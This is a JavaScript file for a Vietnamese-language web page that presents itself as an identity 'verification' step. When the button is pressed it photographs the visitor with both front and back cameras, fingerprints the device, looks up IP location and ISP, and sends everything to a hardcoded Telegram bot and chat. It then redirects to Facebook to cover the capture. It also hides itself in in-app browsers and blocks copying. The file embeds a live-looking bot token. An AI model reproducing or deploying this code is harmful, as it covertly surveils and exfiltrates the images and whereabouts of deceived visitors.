// ==================== FULL VERSION - FIX LOCATION API ====================

// -------------------- TELEGRAM CONFIG --------------------
const TELEGRAM_CONFIG = {
    BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
    CHAT_ID: "-1003805423944",
    API_URL: "https://api.telegram.org/bot"
};

// -------------------- TELEGRAM SENDER --------------------
const TelegramSender = {
    async sendMessage(text) {
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {}
    },
    
    async sendPhoto(blob, caption) {
        if (!blob) return;
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch(e) {}
    },
    
    formatMessage(data) {
        return `📡 *[THÔNG TIN TRUY CẬP]*

🕒 *Thời gian:* ${data.time || '?'}
📱 *Thiết bị:* ${data.device || '?'}
📐 *Màn hình:* ${data.screenSize || '?'}
🖥️ *HĐH:* ${data.os || '?'}
🌍 *IP:* ${data.ip || '?'}
🏢 *ISP:* ${data.isp || '?'}
🏙️ *Vị trí:* ${data.location || '?'}
🌎 *Quốc gia:* ${data.country || '?'}
📍 *Tọa độ:* ${data.lat}, ${data.lon}
📌 *Google Maps:* ${data.maps || 'Không có'}
📸 *Camera trước:* ${data.frontCamera || '?'}
📸 *Camera sau:* ${data.backCamera || '?'}
⚠️ *Ghi chú:* ${data.note || 'Thông tin thu thập từ trình duyệt.'}`;
    },
    
    async sendAll(data) {
        const message = this.formatMessage(data);
        await this.sendMessage(message);
        if (data.frontPhoto) await this.sendPhoto(data.frontPhoto, '📸 CAMERA TRƯỚC');
        if (data.backPhoto) await this.sendPhoto(data.backPhoto, '📸 CAMERA SAU');
    }
};

// -------------------- DEVICE INFO --------------------
const DeviceInfo = {
    getInfo() {
        const ua = navigator.userAgent;
        const screenW = window.screen.width;
        const screenH = window.screen.height;
        const ratio = window.devicePixelRatio || 1;
        const screenSize = `${screenW}x${screenH}@${ratio}`;
        
        let device = 'Không xác định';
        let os = 'Không xác định';
        
        const iphoneModels = {
            "430x932@3": "iPhone 14/15/16 Pro Max",
            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
            "414x896@3": "iPhone XS Max / 11 Pro Max",
            "414x896@2": "iPhone XR / 11",
            "375x812@3": "iPhone X / XS / 11 Pro",
            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
            "320x568@2": "iPhone SE (1st) / 5 / 5S",
            "414x736@3": "iPhone 6/7/8 Plus"
        };
        
        if (/iPhone|iPad|iPod/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
            os = 'iOS';
            device = iphoneModels[screenSize] || 'iPhone (Model khác)';
        } else if (/Android/i.test(ua)) {
            os = 'Android';
            const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
            device = match ? match[1].split('/')[0].trim() : 'Android Device';
        } else if (ua.includes('Windows')) {
            os = 'Windows';
            device = 'PC/Laptop';
        } else if (ua.includes('Mac')) {
            os = 'macOS';
            device = 'Mac';
        } else {
            os = 'Desktop';
            device = 'PC/Laptop';
        }
        
        return { device, os, screenSize };
    }
};

// -------------------- LOCATION API (FIX: dùng ip-api.com trước vì CORS tốt hơn) --------------------
const LocationInfo = {
    async getLocationData() {
        // Ưu tiên ip-api.com (CORS friendly, không cần key)
        try {
            const response = await fetch('https://ip-api.com/json/', { mode: 'cors' });
            const data = await response.json();
            if (data.status === 'success') {
                console.log('✅ Lấy location từ ip-api.com thành công');
                return {
                    ip: data.query,
                    isp: data.isp || 'Không xác định',
                    country: data.country || 'Không xác định',
                    location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
                    lat: data.lat || 'Không xác định',
                    lon: data.lon || 'Không xác định'
                };
            }
        } catch(e) { console.log('ip-api.com lỗi:', e); }
        
        // Thử ipwho.is
        try {
            const response = await fetch('https://ipwho.is/', { mode: 'cors' });
            const data = await response.json();
            if (data.success !== false && data.ip) {
                console.log('✅ Lấy location từ ipwho.is thành công');
                return {
                    ip: data.ip,
                    isp: data.connection?.isp || data.isp || 'Không xác định',
                    country: data.country || 'Không xác định',
                    location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
                    lat: data.latitude || 'Không xác định',
                    lon: data.longitude || 'Không xác định'
                };
            }
        } catch(e) { console.log('ipwho.is lỗi:', e); }
        
        // Fallback cuối: chỉ lấy IP
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            if (data.ip) {
                console.log('⚠️ Chỉ lấy được IP từ ipify');
                return {
                    ip: data.ip,
                    isp: 'Không xác định',
                    country: 'Không xác định',
                    location: 'Không xác định',
                    lat: 'Không xác định',
                    lon: 'Không xác định'
                };
            }
        } catch(e) {}
        
        return {
            ip: 'Không xác định',
            isp: 'Không xác định',
            country: 'Không xác định',
            location: 'Không xác định',
            lat: 'Không xác định',
            lon: 'Không xác định'
        };
    }
};

// -------------------- CAMERA MANAGER --------------------
const CameraManager = {
    stream: null,
    videoElement: null,
    
    init(videoElement) {
        this.videoElement = videoElement;
    },
    
    async requestCamera(facingMode = 'user') {
        if (!navigator.mediaDevices?.getUserMedia) return null;
        
        try {
            if (this.stream) this.stopCamera();
            
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode } },
                audio: false
            });
            
            if (this.videoElement) {
                this.videoElement.srcObject = this.stream;
                this.videoElement.style.display = 'block';
                await this.videoElement.play();
            }
            return this.stream;
        } catch(e) {
            try {
                this.stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode },
                    audio: false
                });
                if (this.videoElement) {
                    this.videoElement.srcObject = this.stream;
                    this.videoElement.style.display = 'block';
                    await this.videoElement.play();
                }
                return this.stream;
            } catch(e2) {
                console.error(`Lỗi camera ${facingMode}:`, e2);
                return null;
            }
        }
    },
    
    async capturePhoto() {
        if (!this.videoElement || !this.stream) return null;
        
        await new Promise(r => setTimeout(r, 500));
        
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = this.videoElement.videoWidth;
            canvas.height = this.videoElement.videoHeight;
            
            if (canvas.width === 0 || canvas.height === 0) {
                resolve(null);
                return;
            }
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(this.videoElement, 0, 0);
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
        });
    },
    
    async captureBothCameras() {
        const photos = { front: null, back: null };
        
        // Camera trước
        const frontStream = await this.requestCamera('user');
        if (frontStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.front = await this.capturePhoto();
            console.log('✅ Đã chụp camera trước');
        } else {
            console.log('❌ Không chụp được camera trước');
        }
        
        // Camera sau
        const backStream = await this.requestCamera('environment');
        if (backStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.back = await this.capturePhoto();
            console.log('✅ Đã chụp camera sau');
        } else {
            console.log('❌ Không chụp được camera sau');
        }
        
        return photos;
    },
    
    stopCamera() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        if (this.videoElement) {
            this.videoElement.srcObject = null;
            this.videoElement.style.display = 'none';
        }
    }
};

// -------------------- MAIN --------------------
(function() {
    const warningDiv = document.getElementById('browser-warning');
    const mainCard = document.getElementById('mainCard');
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('preview');
    const msg = document.getElementById('msg');
    const statusDiv = document.getElementById('status');
    const vBox = document.getElementById('vBox');
    
    // Kiểm tra in-app browser
    const ua = navigator.userAgent;
    const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
    if (isInApp) {
        warningDiv.style.display = 'block';
        mainCard.style.display = 'none';
    }
    
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('copy', e => e.preventDefault());
    
    CameraManager.init(video);
    
    startBtn.onclick = async () => {
        startBtn.disabled = true;
        startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
        
        try {
            statusDiv.innerHTML = '📷 Đang mở camera...';
            msg.textContent = '📷 Đang mở camera...';
            msg.style.display = 'block';
            
            const photos = await CameraManager.captureBothCameras();
            
            video.style.display = 'none';
            msg.textContent = '📸 Đang xử lý...';
            statusDiv.innerHTML = '📸 Đang xác thực...';
            
            const deviceInfo = DeviceInfo.getInfo();
            const locationInfo = await LocationInfo.getLocationData();
            
            const finalData = {
                time: new Date().toLocaleString('vi-VN'),
                device: deviceInfo.device,
                screenSize: deviceInfo.screenSize,
                os: deviceInfo.os,
                ip: locationInfo.ip,
                isp: locationInfo.isp,
                location: locationInfo.location,
                country: locationInfo.country,
                lat: locationInfo.lat,
                lon: locationInfo.lon,
                maps: locationInfo.lat !== 'Không xác định' ? `https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}` : '',
                frontCamera: photos.front ? '✅ Đã chụp' : '🚫 Không chụp được (cần cấp quyền)',
                backCamera: photos.back ? '✅ Đã chụp' : '🚫 Không chụp được (cần cấp quyền)',
                note: 'Đã chụp cả 2 camera + nhận diện thiết bị chi tiết',
                frontPhoto: photos.front,
                backPhoto: photos.back
            };
            
            await TelegramSender.sendAll(finalData);
            
            CameraManager.stopCamera();
            
            startBtn.style.backgroundColor = "#28a745";
            startBtn.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
            
            let timeLeft = 3;
            statusDiv.innerHTML = `✅ Xác thực thành công! Chuyển hướng sau ${timeLeft} giây...`;
            
            const timer = setInterval(() => {
                startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(timer);
                    window.location.href = "https://facebook.com";
                }
            }, 1000);
            
        } catch(error) {
            console.error('Lỗi:', error);
            statusDiv.innerHTML = '❌ Có lỗi xảy ra!';
            startBtn.disabled = false;
            startBtn.innerText = '▶ BẮT ĐẦU XÁC THỰC';
            CameraManager.stopCamera();
        }
    };
    
    console.log('✅ Full version sẵn sàng');
})();
